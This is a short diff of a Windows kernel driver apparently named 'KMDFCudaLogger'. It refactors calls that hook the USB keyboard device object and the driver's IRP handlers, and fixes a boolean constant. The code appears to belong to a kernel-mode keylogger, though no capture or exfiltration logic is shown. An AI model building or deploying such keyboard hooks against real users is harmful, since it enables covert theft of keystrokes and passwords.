@@ -41,7 +41,7 @@ NTSTATUS GetKeyboardMemoryBuffer(IN PDRIVER_OBJECT pDriverObject)
 
 			KdPrint(("about to try to hook keyboard\n"));
 
-			HookKeyboard(pDriverObject, usbBaseKeyboardDeviceObject); // hk
+			HookKeyboard(usbBaseKeyboardDeviceObject);
 
 		}
 	}
@@ -54,7 +54,7 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING Reg
 	NTSTATUS status;
 	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KMDFCudaLogger: DriverEntry\n"));
 
-	HookIrps(DriverObject); // hk
+	HookIrps(DriverObject);
 
 	KdPrint(("Getting Keyboar dMemory Buffer\n"));
 	status = GetKeyboardMemoryBuffer(DriverObject);
@@ -96,7 +96,7 @@ VOID Unload(IN PDRIVER_OBJECT pDriverObject)
 		{
 			KeSetTimer(&kTimer, timeout, NULL);
 			NdisMSleep(1000);
-			KeWaitForSingleObject(&kTimer, Executive, KernelMode, false, NULL);
+			KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
 
 		}
 	}
